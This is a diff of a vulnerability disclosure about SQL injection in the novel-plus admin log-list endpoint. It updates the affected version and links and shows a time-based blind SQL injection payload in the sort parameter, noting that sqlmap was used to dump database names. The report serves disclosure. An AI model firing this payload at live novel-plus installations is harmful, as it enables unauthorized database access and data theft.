@@ -3,10 +3,19 @@
 
 # novel-plus系统novel-admin子系统common/log/list接口存在SQL注入
 
-### novel-plus：https://github.com/201206030/novel-plus
-### Version：https://github.com/201206030/novel-plus/releases/tag/4.2.0
+#### official website: https://novel.xxyopen.com/index.htm
+ 
+#### github: https://github.com/201206030/novel-plus
+ 
+#### Affected version: v4.3.0-RC1
+ 
+#### releases：https://github.com/201206030/novel-plus/releases/tag/v4.3.0-RC1
+ 
 
-> Payload: http://127.0.0.1:8088/common/log/list?limit=10&offset=0&sort=gmt_create AND (SELECT 1155 FROM (SELECT(SLEEP(5)))YVhZ)&order=desc&operation=&username=
+Payload: 
+```
+http://127.0.0.1:8088/common/log/list?limit=10&offset=0&sort=gmt_create AND (SELECT 1155 FROM (SELECT(SLEEP(5)))YVhZ)&order=desc&operation=&username=
+```
 
 Use sqlmap for verification, and retrieve all the database names.
 
